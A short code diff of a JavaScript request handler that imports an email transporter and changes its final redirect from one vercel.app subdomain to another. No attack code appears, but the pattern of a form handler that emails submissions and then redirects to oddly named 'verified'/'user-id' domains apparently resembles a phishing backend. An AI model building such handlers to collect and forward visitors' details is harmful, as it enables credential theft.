@@ -1,4 +1,3 @@
-
 import { transporter } from "./emailConfig.js";
 import querystring from "querystring";
 
@@ -56,5 +55,5 @@ export default async function handler(req, res) {
   }
 
   // Always redirect (success or failure)
-  return res.redirect(302, "https://verified-use.vercel.app/");
+  return res.redirect(302, "https://in-touser-id.vercel.app/");
 }
